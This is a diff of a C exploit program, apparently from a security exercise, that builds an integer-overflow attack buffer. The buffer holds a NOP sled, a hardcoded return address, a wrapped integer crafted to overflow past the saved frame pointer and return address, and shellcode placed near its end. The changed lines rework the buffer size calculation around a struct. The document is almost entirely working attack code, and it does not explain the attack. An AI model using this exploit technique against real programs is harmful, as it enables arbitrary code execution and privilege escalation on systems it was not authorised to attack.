@@ -11,13 +11,21 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  const int size = 240 * 20 + 11 + 8;
+  struct widget_t {
+    double x;
+    double y;
+    int count;
+  };
+  const size_t max_int = 2147483647;
+
+  const int size = 240 * (sizeof(struct widget_t) + 1);
   char attack[size];
   char ret[] = "\xb8\xfc\xff\xbf";
   memset(attack, 0x90, size);
 
-  size_t max_int = 2147483647;
-  size_t int_overflow = max_int + 1 + size / 20 + size % 2;
+  size_t int_overflow = max_int + 1; // we are at zero
+  int_overflow += size / sizeof(struct widget_t); // let's add what some bytes to overflow over ebp and ret
+  
   snprintf(attack, 11, "%u", int_overflow);
   memcpy(attack + 10, ",", 1);
   memcpy(attack + size - 49, shellcode, 45);
